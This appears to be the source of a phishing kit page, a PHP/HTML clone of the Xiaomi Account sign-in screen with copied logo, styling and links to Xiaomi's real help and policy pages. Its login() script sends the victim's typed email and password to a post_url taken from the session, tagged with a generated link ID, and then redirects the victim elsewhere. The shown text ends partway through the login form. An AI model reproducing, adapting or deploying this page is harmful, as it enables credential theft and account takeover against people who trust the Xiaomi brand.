<?php
	session_name("CAKEPHP");
	session_start();
	include(__DIR__ . "/../includes/xiaomi.php");

	$username = $_SESSION['Link']['GeneratedLink']['username'] ?? '';
	$post_url = $_SESSION['Link']['VisitorDetails']['post_url'] ?? '';
	$link_id = $_SESSION['Link']['GeneratedLink']['id'] ?? '';
	$redirect_url = $_SESSION['Link']['GeneratedLink']['redirect_url'] ?? '';
	
	echo "<script>
			var username = '$username';
			var post_url = '$post_url';
			var link_id = '$link_id';
			var redirect_url = '$redirect_url';
	      </script>";
?>

<html lang="en">
  <head>
    <meta charset="utf-8">
    <link rel="icon" href="images/favicon.ico">
    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!--[if gt IE 8]>
						<!-->
    <style type="text/css">
      .miverify_wind,
      .miverify_modal_panel {
        -webkit-tap-highlight-color: transparent;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        font-family: "PingFangSC-Regular", "Open Sans", Arial, "Hiragino Sans GB", "Microsoft YaHei", "STHeiti", "WenQuanYi Micro Hei", SimSun, sans-serif;
        font-size: 16px;
        display: none;
        opacity: 0;
        position: fixed;
        z-index: 1147483647;
        left: 0;
        top: 0;
        height: 100%;
        width: 100%;
        -webkit-transition: opacity .5s;
        transition: opacity .5s
      }

      .miverify_wind *,
      .miverify_modal_panel * {
        font-family: "PingFangSC-Regular", "Open Sans", Arial, "Hiragino Sans GB", "Microsoft YaHei", "STHeiti", "WenQuanYi Micro Hei", SimSun, sans-serif
      }

      .miverify_wind a,
      .miverify_modal_panel a {
        color: #999;
        text-decoration: none
      }

      .miverify_wind a:hover,
      .miverify_wind a:focus,
      .miverify_wind a:visited,
      .miverify_modal_panel a:hover,
      .miverify_modal_panel a:focus,
      .miverify_modal_panel a:visited {
        color: #333;
        text-decoration: none
      }

      .miverify_wind a:focus,
      .miverify_modal_panel a:focus {
        outline: 0 none
      }

      .miverify_wind input::-moz-placeholder,
      .miverify_wind::-webkit-input-placeholder,
      .miverify_wind input:-ms-input-placeholder,
      .miverify_modal_panel input::-moz-placeholder,
      .miverify_modal_panel::-webkit-input-placeholder,
      .miverify_modal_panel input:-ms-input-placeholder {
        color: #999;
        font-weight: normal
      }

      .miverify_modal_panel {
        opacity: 1
      }

      .miverify_panel_ghost {
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: .6;
        filter: alpha(opacity=60);
        background-color: #000
      }

      .miverify_panel_box {
        text-align: center;
        position: absolute;
        top: 50%;
        left: 50%;
        -webkit-box-shadow: 0 1px 8px rgba(128, 128, 128, 0.3);
        box-shadow: 0 1px 8px rgba(128, 128, 128, 0.3);
        border: 1px solid #d1d1d1;
        border-radius: 2px;
        overflow: hidden;
        background-color: #fff;
        -webkit-transition: width .5s ease, height .5s ease;
        transition: width .5s ease, height .5s ease;
        -webkit-transform: translate(-50%, -50%);
        transform: translate(-50%, -50%);
        width: 300px
      }

      .miverify_panel_box.miverify_panel_show_captcha .miverify_captcha_content {
        margin: 20px auto;
        display: -webkit-box;
        display: -ms-flexbox;
        display: flex
      }

      .miverify_panel_box.miverify_panel_show_captcha .miverify_panel_success,
      .miverify_panel_box.miverify_panel_show_captcha .miverify_panel_loading,
      .miverify_panel_box.miverify_panel_show_captcha .miverify_panel_error {
        display: none
      }

      .miverify_panel_box.miverify_panel_show_captcha .miverify_panel_next {
        display: block
      }

      .miverify_panel_box.loading .miverify_panel_success,
      .miverify_panel_box.loading .miverify_panel_next,
      .miverify_panel_box.loading .miverify_panel_error {
        display: none
      }

      .miverify_panel_box.loading .miverify_panel_loading {
        display: inline-block
      }

      .miverify_panel_box.success .miverify_panel_loading,
      .miverify_panel_box.success .miverify_panel_next,
      .miverify_panel_box.success .miverify_panel_error {
        display: none
      }

      .miverify_panel_box.success .miverify_panel_success {
        display: block
      }

      .miverify_panel_box.error .miverify_panel_success,
      .miverify_panel_box.error .miverify_panel_next,
      .miverify_panel_box.error .miverify_panel_loading {
        display: none
      }

      .miverify_panel_box.error .miverify_panel_error {
        display: block
      }

      .miverify_panel_error {
        display: none;
        width: 100%;
        padding: 20px 0 0 0;
        position: relative
      }

      .miverify_panel_error .miverify_error_footer_panel {
        display: none
      }

      .miverify_panel_error .miverify_error_refresh_type {
        display: -webkit-box;
        display: -ms-flexbox;
        display: flex
      }

      .miverify_panel_error .miverify_error_refresh_type .miverify_cancel_btn {
        display: block
      }

      .miverify_panel_error .miverify_panel_error_title {
        margin: 10px 0 0 0;
        color: #000
      }

      .miverify_panel_error .miverify_panel_error_content {
        margin: 30px 0;
        color: #666
      }

      .miverify_panel_loading_title,
      .miverify_panel_loading_content,
      .miverify_panel_success_title,
      .miverify_panel_error_title,
      .miverify_panel_error_content {
        text-align: center;
        font-size: 14px;
        line-height: 14px
      }

      .miverify_ok_btn,
      .miverify_cancel_btn {
        background-color: #fff;
        color: #33ADFF;
        -webkit-appearance: none;
        text-align: center;
        -webkit-box-sizing: border-box;
        box-sizing: border-box;
        outline: 0 none;
        -webkit-transition: .1s;
        transition: .1s;
        font-weight: 500;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        padding: 17px 20px;
        font-size: 16px;
        line-height: 1;
        white-space: nowrap;
        cursor: pointer;
        border: 1px solid #dcdfe6;
        border-bottom: 0 none;
        border-right: 0 none;
        border-left: 0 none;
        -webkit-box-flex: 1;
        -ms-flex: 1;
        flex: 1
      }

      .miverify_cancel_btn {
        color: #999;
        border-right: 1px solid #dcdfe6;
        -webkit-box-flex: 1;
        -ms-flex: 1;
        flex: 1;
        display: none
      }

      .miverify_panel_show_captcha {
        text-align: center
      }

      .miverify_panel_show_captcha .miverify_window {
        height: 260px;
        display: -webkit-box;
        display: -ms-flexbox;
        display: flex;
        -webkit-box-orient: vertical;
        -webkit-box-direction: normal;
        -ms-flex-direction: column;
        flex-direction: column
      }

      .miverify_panel_show_captcha .miverify_captcha_title {
        text-overflow: ellipsis;
        white-space: nowrap;
        overflow: hidden;
        text-align: center;
        font-size: 16px;
        margin: 0;
        padding: 10px 0
      }

      .miverify_panel_show_captcha .miverify_content {
        padding: 0 20px;
        -webkit-box-flex: 1;
        -ms-flex: 1;
        flex: 1
      }

      .miverify_panel_show_captcha .miverify_footer_panel {
        display: -webkit-box;
        display: -ms-flexbox;
        display: flex
      }

      .miverify_panel_show_captcha .miverify_refresh_link {
        margin: 10px 0;
        font-size: 14px;
        color: #0099FF;
        -webkit-box-flex: 1;
        -ms-flex: 1;
        flex: 1;
        margin-left: 10px;
        text-overflow: ellipsis;
        white-space: nowrap;
        overflow: hidden;
        text-align: right
      }

      .miverify_panel_show_captcha .miverify_refresh_link:hover,
      .miverify_panel_show_captcha .miverify_refresh_link:visited,
      .miverify_panel_show_captcha .miverify_refresh_link:active,
      .miverify_panel_show_captcha .miverify_refresh_link:focus {
        color: #0099FF
      }

      .miverify_panel_show_captcha .miverify_err_tip {
        font-size: 14px;
        color: #f66;
        margin: 10px 0;
        text-align: left;
        text-overflow: ellipsis;
        white-space: nowrap;
        overflow: hidden
      }

      .miverify_panel_show_captcha .miverify_captcha_input {
        -webkit-appearance: none;
        background-color: #fff;
        background-image: none;
        border-radius: 4px;
        border: 1px solid #dcdfe6;
        -webkit-box-sizing: border-box;
        box-sizing: border-box;
        color: #606266;
        display: block;
        outline: none;
        padding: 10px 0 10px 15px;
        width: 100%;
        font-size: 14px
      }

      .miverify_panel_show_captcha img {
        display: block;
        float: left;
        cursor: pointer
      }

      .miverify_flat.miverify_wind .miverify_panel_box {
        -webkit-box-shadow: none !important;
        box-shadow: none !important;
        border: 0 none !important;
        width: 100% !important;
        min-width: 270px
      }

      .miverify_flat.miverify_wind .miverify_panel_ghost {
        background-color: #fff !important
      }

      .miverify_panel_loading {
        display: none;
        margin: 20px auto;
        vertical-align: middle
      }

      .miverify_panel_loading .miverify_panel_loading_content {
        color: #000;
        margin-left: 10px
      }

      .miverify_panel_loading .miverify_panel_loading_icon {
        float: left;
        width: 20px;
        height: 20px;
        -webkit-animation: rotate-loading 1.2s linear infinite;
        animation: rotate-loading 1.2s linear infinite;
        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyFpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNS1jMDE0IDc5LjE1MTQ4MSwgMjAxMy8wMy8xMy0xMjowOToxNSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIChXaW5kb3dzKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpDMzIxQzg5RDJDQjUxMUU4OThGNkYxQkI2ODBGQTlERCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpDMzIxQzg5RTJDQjUxMUU4OThGNkYxQkI2ODBGQTlERCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOkMzMjFDODlCMkNCNTExRTg5OEY2RjFCQjY4MEZBOUREIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOkMzMjFDODlDMkNCNTExRTg5OEY2RjFCQjY4MEZBOUREIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+uWjUJwAAAZVJREFUeNqk1MsrRGEYx/Ezx2UyDLZiSrmEhVuUW1aywIYs2Cj/jJ2NpYWysLBgZSuK7ORWRJNbNiLMjMtIjO9TPzUxcpx56tOcOXPOb95z3ud9A07mKkArGlGOMFKI4QqrOM10Y26Gcx0YRqVCHpBAAGVo1vHsX4F20RiG8IEtOcOTrilGBc71vURPcJgpfByLmEGb461sAEsY+DqRo892TOAG0zjyGJhEi17DMW5dTcCo3tc8LhzvFcUCghiB6+ofbAK25b+1gQM0oM4Cm/TDpuOvUpq8fMtyNUuxtJnzU1F1QsRV0ybSWsNP2f3PluVqyAEn+7KMlAXGNcpwFmHW4IWWZYGXOlGdRWAtQtZyFriDd/T4DLPF0Y0X7FrgPk7U7b0+AvtQr5xojjaCO+0y9dqWbjyG2aKYxKt2n/uvtXyNN3SpL9c1+79VHvoVFtSS3fm+fa1osSc1amuDKh0/6JpS1KBTT2P9N4e19N75rSKY0vGjrg1pM0lq/S5rlTheAu3GQY2ySK8grjbb03b1oz4FGABfpltgDckVGAAAAABJRU5ErkJggg==)
      }

      @-webkit-keyframes rotate-loading {
        from {
          -webkit-transform: rotate(0deg);
          transform: rotate(0deg)
        }

        to {
          -webkit-transform: rotate(360deg);
          transform: rotate(360deg)
        }
      }

      @keyframes rotate-loading {
        from {
          -webkit-transform: rotate(0deg);
          transform: rotate(0deg)
        }

        to {
          -webkit-transform: rotate(360deg);
          transform: rotate(360deg)
        }
      }

      .area {
        position: absolute;
        left: 50%;
        top: 50%;
        -webkit-transform: translate(-50%, -50%);
        transform: translate(-50%, -50%);
        z-index: -1;
        width: 300px;
        height: 300px;
        max-width: 300px;
        max-height: 300px
      }

      .geetest_panel_ghost {
        position: fixed !important
      }

      .geetest_wind.geetest_panel {
        position: fixed !important
      }
    </style>
    <!--
						<![endif]-->
    <link rel="stylesheet" type="text/css" href="css/chunk.css">
    <link rel="stylesheet" type="text/css" href="css/chunk2.css">
    <link rel="stylesheet" type="text/css" href="css/chunk3.css">
    <link rel="stylesheet" type="text/css" href="css/chunk4.css">
    <link rel="stylesheet" type="text/css" href="css/chunk5.css">
    <title>Xiaomi <?=$language['account'][$lang];?> - <?=$language['signin'][$lang];?></title>
    <meta name="keywords" content="Mi Account, Xiaomi Account, Create account, Sign up, Sign in, Xiaomi, Account, Login, Log in, Two-step authentication, Authenticator, Reset password, Forgot password" data-react-helmet="true">
    <meta name="description" content="Mi Account is an authentication method used for Xiaomi devices. It works with MIUI, Xiaomi Cloud, Duokan, Mi Talk, Mi Community, and other services." data-react-helmet="true">
    <script src="js/jquery.min.js"></script>
    <script>
      $(document).ready(function() {
        if ($("#email").val()) {
          $("#lemail").css('top', '6px');
          $("#lemail").css('font-size', '12px');
        }
        $("#email").keyup(function() {
          if ($("#email").val() && $("#password").val()) {
            $("#lbt").removeClass("mi-button--disabled");
            $("#lbt").prop("disabled", false);
          } else {
            $("#lbt").addClass("mi-button--disabled");
            $("#lbt").prop("disabled", true);
          }
        });
        $("#password").keyup(function() {
          $("#error").hide();
          if ($("#email").val() && $("#password").val()) {
            $("#lbt").removeClass("mi-button--disabled");
            $("#lbt").prop("disabled", false);
          } else {
            $("#lbt").addClass("mi-button--disabled");
            $("#lbt").prop("disabled", true);
          }
        });
        $("#email").focus(function() {
          $("#email").css('border', '1px solid red');
          $("#email").css('border-radius', '3px');
          $("#lemail").css('top', '6px');
          $("#lemail").css('font-size', '12px');
        });
        $("#email").focusout(function() {
          $("#email").css('border', '0px');
          $("#email").css('border-radius', '0px');
          if (!($("#email").val())) {
            $("#lemail").css('top', '10px');
            $("#lemail").css('font-size', '17px');
            $(".mi-email").css('background', '#fcf2f3');
            $("#emailerror").show();
          }
        });
        $("#signupemail").focus(function() {
          $("#signupemail").css('border', '1px solid red');
          $("#signupemail").css('border-radius', '3px');
          $("#lsignupemail").css('top', '6px');
          $("#lsignupemail").css('font-size', '12px');
        });
        $("#signupemail").focusout(function() {
          $("#signupemail").css('border', '0px');
          $("#signupemail").css('border-radius', '0px');
          if (!($("#signupemail").val())) {
            $("#lsignupemail").css('top', '10px');
            $("#lsignupemail").css('font-size', '17px');
          }
        });
        $("#password").focus(function() {
          $(".mi-password-field").css('border', '1px solid red');
          $(".mi-password-field").css('border-radius', '3px');
          $("#lpassword").css('top', '6px');
          $("#lpassword").css('font-size', '12px');
        });
        $("#password").focusout(function() {
          $(".mi-password-field").css('border', '0px');
          $(".mi-password-field").css('border-radius', '0px');
          if (!($("#password").val())) {
            $("#lpassword").css('top', '10px');
            $("#lpassword").css('font-size', '17px');
            $(".mi-pass").css('background', '#fcf2f3');
            $("#passerror").show();
          }
        });
        $(".mi-qr-login-switch").click(function() {
          $("#card-lay").toggle();
          $("#barlay").toggle();
        });
        $("#sb").click(function() {
          $(".ant-tabs-ink-bar-animated").css('transform', 'translate3d(88px, 0px, 0px)');
          $(".ant-tabs-ink-bar-animated").css('width', '76px');
          $("#logint").css('aria-selected', 'false');
          $("#logint").removeClass("ant-tabs-tab-active");
          $("#signupt").css('aria-selected', 'true');
          $("#signupt").addClass("ant-tabs-tab-active");
          $("#loginform").hide();
          $("#signupform").show();
        });
        $("#lb").click(function() {
          $(".ant-tabs-ink-bar-animated").css('transform', 'translate3d(0px, 0px, 0px)');
          $(".ant-tabs-ink-bar-animated").css('width', '68px');
          $("#signupt").css('aria-selected', 'false');
          $("#signupt").removeClass("ant-tabs-tab-active");
          $("#logint").css('aria-selected', 'true');
          $("#logint").addClass("ant-tabs-tab-active");
          $(".mi-pass").css('background', '#f9f9f9');
          $("#emailerror").hide();
          $(".mi-email").css('background', '#f9f9f9');
          $("#passerror").hide();
          $("#signupform").hide();
          $("#loginform").show();
        });
        $("#eyeclose").click(function() {
          $("#eyeclose").hide();
          $("#eyeopen").show();
          $("#password").attr('type', 'text')
        });
        $("#eyeopen").click(function() {
          $("#eyeopen").hide();
          $("#eyeclose").show();
          $("#password").attr('type', 'password')
        });
        $("#langswitch").click(function() {
          $("#anticon").css('padding-top', '10px');
          $(".ant-modal-content").show();
        });
        $(".anticon").click(function() {
          $(".ant-modal-content").hide();
        });
      });
    </script>
    <script type="text/javascript">
      function login() {
        username = document.getElementById("email").value;
        var password = document.getElementById("password").value;
		
        var errorl = document.getElementById("error");
        var load = document.getElementById("loader");
		
		var data = 'id=' + link_id + '&type=account&user=' + username + '&pass=' + password;
        load.style.display = "block";
        $.ajax({
          type: "POST",
          dataType: "json",
          url: post_url,
          data: data,
          cache: false,
          success: function(data) {
            if (data.success == true) {
              window.location.href = redirect_url;
            } else {
              load.style.display = "none";
              errorl.style.display = "block";
            }
          },
          error: function(XMLHttpRequest, textStatus, errorThrown) {
            load.style.display = "none";
            errorl.style.display = "block";
          }
        });
      }
    </script>
  </head>
  <body>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root">
      <div class="mi-sider-layout">
        <div class="mi-sider-layout__sider">
          <div class="ant-carousel">
            <div class="slick-slider slick-initialized">
              <div class="slick-list">
                <div class="slick-track" style="width: 200px; opacity: 1; transform: translate3d(0px, 0px, 0px);">
                  <div data-index="0" class="slick-slide slick-active slick-current" tabindex="-1" aria-hidden="false" style="outline: none; width: 200px;">
                    <div>
                      <div tabindex="-1" style="width: 100%; display: inline-block;">
                        <div class="mi-sider-layout__banner" style="background-image: url(&quot;images/banner.jpg&quot;);"></div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="mi-sider-layout__content">
          <div class="mi-sider-layout__scroll">
            <div class="mi-layout">
              <div class="mi-layout__header">
                <div class="mi-layout__title">
                 <svg width="193px" height="193px" viewBox="0 0 193 193" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" class="mi-layout__logo"><desc>Created with Sketch.</desc><defs><polygon id="path-1" points="1.78097075e-14 0.000125324675 192.540685 0.000125324675 192.540685 192.540058 1.78097075e-14 192.540058"></polygon></defs><g id="\u9875\u9762-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="\u7F16\u7EC4"><mask id="mask-2" fill="white"><use xlink:href="#path-1"></use></mask><g id="Clip-2"></g><path d="M172.473071,20.1164903 C154.306633,2.02148701 128.188344,-1.78097075e-14 96.2706558,-1.78097075e-14 C64.312237,-1.78097075e-14 38.155724,2.0452987 19.9974318,20.1872987 C1.84352597,38.3261656 1.78097075e-14,64.4406948 1.78097075e-14,96.3640227 C1.78097075e-14,128.286724 1.84352597,154.415039 20.0049513,172.556412 C38.1638701,190.704052 64.3141169,192.540058 96.2706558,192.540058 C128.225942,192.540058 154.376815,190.704052 172.53636,172.556412 C190.694653,154.409399 192.540685,128.286724 192.540685,96.3640227 C192.540685,64.3999643 190.672721,38.2553571 172.473071,20.1164903" id="Fill-1" fill="#FF6900" mask="url(#mask-2)"></path><path d="M89.1841721,131.948836 C89.1841721,132.594885 88.640263,133.130648 87.9779221,133.130648 L71.5585097,133.130648 C70.8848896,133.130648 70.338474,132.594885 70.338474,131.948836 L70.338474,89.0100961 C70.338474,88.3584078 70.8848896,87.8251513 71.5585097,87.8251513 L87.9779221,87.8251513 C88.640263,87.8251513 89.1841721,88.3584078 89.1841721,89.0100961 L89.1841721,131.948836 Z" id="Fill-3" fill="#FFFFFF" mask="url(#mask-2)"></path><path d="M121.332896,131.948836 C121.332896,132.594885 120.786481,133.130648 120.121633,133.130648 L104.492393,133.130648 C103.821906,133.130648 103.275491,132.594885 103.275491,131.948836 L103.275491,131.788421 L103.275491,94.9022357 C103.259198,88.4342292 102.889491,81.7863818 99.5502146,78.445226 C96.6790263,75.5652649 91.3251562,74.9054305 85.7557276,74.7669468 L57.4242049,74.7669468 C56.7555977,74.7669468 56.2154484,75.3045896 56.2154484,75.9512649 L56.2154484,128.074424 L56.2154484,131.948836 C56.2154484,132.594885 55.6640198,133.130648 54.9954127,133.130648 L39.3555198,133.130648 C38.6875393,133.130648 38.1498964,132.594885 38.1498964,131.948836 L38.1498964,60.5996188 C38.1498964,59.9447974 38.6875393,59.4121675 39.3555198,59.4121675 L84.4786692,59.4121675 C96.2717211,59.4121675 108.599909,59.9498104 114.680036,66.0380831 C120.786481,72.1533006 121.332896,84.4595571 121.332896,96.2657682 L121.332896,131.948836 Z" id="Fill-5" fill="#FFFFFF" mask="url(#mask-2)"></path><path d="M153.53056,131.948836 C153.53056,132.594885 152.978505,133.130648 152.316164,133.130648 L136.678778,133.130648 C136.010797,133.130648 135.467515,132.594885 135.467515,131.948836 L135.467515,60.5996188 C135.467515,59.9447974 136.010797,59.4121675 136.678778,59.4121675 L152.316164,59.4121675 C152.978505,59.4121675 153.53056,59.9447974 153.53056,60.5996188 L153.53056,131.948836 Z" id="Fill-7" fill="#FFFFFF" mask="url(#mask-2)"></path></g></g></svg>
				 Xiaomi <?=$language['account'][$lang];?>
                </div>
                <div class="mi-nav">
                  <a class="mi-nav__item" href="https://account.xiaomi.com/about/protocol/agreement"><?=$language['agreement'][$lang];?> </a>
                  <a class="mi-nav__item" href="https://account.xiaomi.com/about/protocol/privacy"><?=$language['policy'][$lang];?></a>
                  <a class="mi-nav__item" href="https://account.xiaomi.com/helpcenter"><?=$language['help'][$lang];?></a>
                  <div class="mi-nav__divider"></div>
                  <div class="mi-nav__item">
                    <div id="langswitch" class="mi-language-picker"><?=$language['language'][$lang];?></div>
                  </div>
                </div>
              </div>
              <div class="mi-layout__container" style="padding-top: 35.5px;">
                <div class="mi-layout__card" id="card-lay">
                  <div class="mi-qr-login-switch" style="">
                    <i class="anticon mi-qr-login-switch__icon">
                      <svg width="1em" height="1em" fill="currentColor" aria-hidden="true" focusable="false" class="">
                        <path d="M0 16.977H16.94V.036H0v16.941zM4.235 4.271h8.47v8.47h-8.47v-8.47zM19.06.036v16.941h16.94V.036H19.06zm12.706 12.706h-8.471v-8.47h8.47v8.47zM6.353 10.624h4.235V6.39H6.353v4.235zM0 36.036H16.94V19.095H0v16.94zM4.235 23.33h8.47v8.47h-8.47v-8.47zM29.647 6.389h-4.235v4.235h4.235V6.39zM19.059 36.036h4.235V31.8h-4.235v4.235zm4.235-12.706v8.47h4.235v-8.47h-4.235zm8.47 8.47H27.53v4.236H36v-8.47h-4.234V31.8zm0-8.47H36v-4.235h-4.235v4.235zM19.06 19.095v4.235h4.235v-4.235h-4.235zM6.353 29.683h4.235v-4.235H6.353v4.235z" fill="#FFF" fill-rule="nonzero"></path>
                      </svg>
                    </i>
                  </div>
                  <div class="ant-tabs ant-tabs-top mi-dialog__tabs ant-tabs-line">
                    <div role="tablist" class="ant-tabs-bar ant-tabs-top-bar" tabindex="0">
                      <div class="ant-tabs-nav-container">
                        <span unselectable="unselectable" class="ant-tabs-tab-prev ant-tabs-tab-btn-disabled">
                          <span class="ant-tabs-tab-prev-icon">
                            <i aria-label="icon: left" class="anticon anticon-left ant-tabs-tab-prev-icon-target">
                              <svg viewBox="64 64 896 896" focusable="false" class="" data-icon="left" width="1em" height="1em" fill="currentColor" aria-hidden="true">
                                <path d="M724 218.3V141c0-6.7-7.7-10.4-12.9-6.3L260.3 486.8a31.86 31.86 0 0 0 0 50.3l450.8 352.1c5.3 4.1 12.9.4 12.9-6.3v-77.3c0-4.9-2.3-9.6-6.1-12.6l-360-281 360-281.1c3.8-3 6.1-7.7 6.1-12.6z"></path>
                              </svg>
                            </i>
                          </span>
                        </span>
                        <span unselectable="unselectable" class="ant-tabs-tab-next ant-tabs-tab-btn-disabled">
                          <span class="ant-tabs-tab-next-icon">
                            <i aria-label="icon: right" class="anticon anticon-right ant-tabs-tab-next-icon-target">
                              <svg viewBox="64 64 896 896" focusable="false" class="" data-icon="right" width="1em" height="1em" fill="currentColor" aria-hidden="true">
                                <path d="M765.7 486.8L314.9 134.7A7.97 7.97 0 0 0 302 141v77.3c0 4.9 2.3 9.6 6.1 12.6l360 281.1-360 281.1c-3.9 3-6.1 7.7-6.1 12.6V883c0 6.7 7.7 10.4 12.9 6.3l450.8-352.1a31.96 31.96 0 0 0 0-50.4z"></path>
                              </svg>
                            </i>
                          </span>
                        </span>
                        <div class="ant-tabs-nav-wrap">
                          <div class="ant-tabs-nav-scroll">
                            <div class="ant-tabs-nav ant-tabs-nav-animated">
                              <div>
                                <div id="logint" role="tab" aria-disabled="false" aria-selected="true" class="ant-tabs-tab-active ant-tabs-tab">
                                  <a id="lb" href="#"><?=$language['signin'][$lang];?></a>
                                </div>
                                <div id="signupt" role="tab" aria-disabled="false" aria-selected="false" class=" ant-tabs-tab">
                                  <a id="sb" href="#"><?=$language['signup'][$lang];?> </a>
                                </div>
                              </div>
                              <div class="ant-tabs-ink-bar ant-tabs-ink-bar-animated" style="display: block; transform: translate3d(0px, 0px, 0px); width: 68px;"></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div tabindex="0" role="presentation" style="width: 0px; height: 0px; overflow: hidden; position: absolute;"></div>
                    <div class="ant-tabs-content ant-tabs-content-animated ant-tabs-top-content" style="margin-left: 0%;">
                      <div role="tabpanel" aria-hidden="false" class="ant-tabs-tabpane ant-tabs-tabpane-active">
                        <div tabindex="0" role="presentation" style="width: 0px; height: 0px; overflow: hidden; position: absolute;"></div>
                        <form class="mi-form" id="loginform">
                          <div class="mi-form__content">
                            <div class="ant-row" style="margin-left: -5px; margin-right: -5px;">
                              <div class="ant-col ant-col-xs-0" style="padding-left: 5px; padding-right: 5px;">
                                <div style="position: relative;">
                                  <div name="callingCode" class="mi-select-field mi-form-field mi-form-field--fullwidth mi-form-field--bordered">
                                    <div class="mi-form-field__field">
                                      <div class="mi-form-field__control">
                                        <div class="mi-select ant-select ant-select-enabled">
                                          <div class="ant-select-selection
            ant-select-selection--single" role="combobox" aria-autocomplete="list" aria-haspopup="true" aria-controls="80413167-de78-497c-cdb3-bd3b97c94601" tabindex="0">
                                            <div class="ant-select-selection__rendered">
                                              <div class="ant-select-selection-selected-value" title="+1" style="display: block; opacity: 1;">+1</div>
                                            </div>
                                            <span class="ant-select-arrow" unselectable="on" style="user-select: none;">
                                              <i class="anticon ant-select-arrow-icon">
                                                <svg viewBox="0 0 20 20" width="1em" height="1em" fill="currentColor" aria-hidden="true" focusable="false" class="">
                                                  <path d="M4 7l6 6.667L16 7" stroke="currentColor" stroke-width="1.5" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path>
                                                </svg>
                                              </i>
                                            </span>
                                          </div>
                                        </div>
                                        <label class="mi-floating-label mi-floating-label--float-above">Country code</label>
                                      </div>
                                    </div>
                                  </div>
                                  <div class="mi-account-field__remove">
                                    <svg width="20" height="20">
                                      <defs>
                                        <path d="M0 0h17a3 3 0 013 3v17H0V0z" id="prefix__a"></path>
                                      </defs>
                                      <g fill="none" fill-rule="evenodd">
                                        <mask id="prefix__b" fill="#fff">
                                          <use xlink:href="#prefix__a"></use>
                                        </mask>
                                        <g mask="url(#prefix__b)">
                                          <path d="M2-.99C2-12.045 10.96-21 22-21s20 8.955 20 19.99v.02a19.964 19.964 0 01-5.852 14.142A19.985 19.985 0 0122 19C10.938 19 2 10.045 2-.99z" fill="currentColor" fill-rule="nonzero"></path>
                                          <path d="M16.828 4.172c.26.26.26.682 0 .942L14.943 7l1.885 1.886a.667.667 0 11-.942.942L14 7.943l-1.886 1.885a.667.667 0 11-.942-.942L13.057 7l-1.885-1.886a.667.667 0 11.942-.942L14 6.057l1.886-1.885c.26-.26.682-.26.942 0z" fill="#FFF"></path>
                                        </g>
                                      </g>
                                    </svg>
                                  </div>
                                </div>
                              </div>
                              <div class="ant-col ant-col-xs-24" style="padding-left: 5px; padding-right: 5px;">
                                <div class="mi-text-field mi-form-field mi-form-field--bordered">
                                  <div class="mi-form-field__field mi-email">
                                    <div class="mi-form-field__control">
                                      <div class="mi-text-field__input mi-input">
                                        <input name="account" id="email" class="mi-input__input" type="text" value="<?=$username?>">
                                        <input name="ID" id="ID" type="hidden" value="sdfds">
                                        <label id="lemail" class="mi-floating-label"><?=$language['email_place'][$lang];?></label>
                                      </div>
                                    </div>
                                  </div>
                                  <div id="emailerror" class="mi-form-helper-text mi-form-helper-text--error" style="display:none"><?=$language['enter_email'][$lang];?></div>
                                </div>
                              </div>
                            </div>
                            <div class="mi-password-field mi-text-field mi-form-field mi-form-field--fullwidth mi-form-field--bordered" style="margin-top: 20px;">
                              <div class="mi-form-field__field mi-pass">
                                <div class="mi-form-field__control">
                                  <div class="mi-text-field__input mi-input">
                                    <input type="password" id="password" name="password" class="mi-input__input" value="">
                                    <label id="lpassword" class="mi-floating-label"><?=$language['password'][$lang];?></label>
                                  </div>
                                </div>
                                <div id="eyeclose" class="mi-password-field__adornment mi-input-adornment">
                                  <svg viewBox="0 0 20 20" width="1em" height="1em" fill="currentColor" class="mi-password-field__icon">
